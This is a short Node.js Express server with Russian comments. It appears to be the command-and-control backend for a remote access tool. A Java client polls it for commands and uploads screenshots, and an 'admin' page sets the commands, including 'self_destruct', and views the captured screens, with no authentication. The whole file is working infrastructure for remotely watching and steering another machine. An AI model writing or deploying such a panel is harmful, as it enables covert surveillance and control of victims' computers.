const express = require('express');
const bodyParser = require('body-parser');
const path = require('path');
const app = express();

// Лимиты для тяжелых данных (скриншоты)
app.use(bodyParser.urlencoded({ limit: '50mb', extended: true }));
app.use(bodyParser.json({ limit: '50mb' }));

let lastCommand = "none";
let lastScreen = "";

// Главная страница (Админка)
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// Команда для Java
app.get('/get-command', (req, res) => {
    res.send(lastCommand);
    if (lastCommand === "self_destruct") lastCommand = "none";
});

// Установка команды с сайта
app.get('/set-command', (req, res) => {
    lastCommand = req.query.cmd || "none";
    res.send("Команда принята: " + lastCommand);
});

// Прием скрина
app.post('/upload-screen', (req, res) => {
    lastScreen = req.body.img || "";
    res.sendStatus(200);
});

// Отдача скрина на сайт
app.get('/get-screen', (req, res) => {
    res.send(lastScreen);
});

// ЗАПУСК (Render сам подставит нужный порт)
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log("SERVER RUNNING ON PORT " + PORT);
});
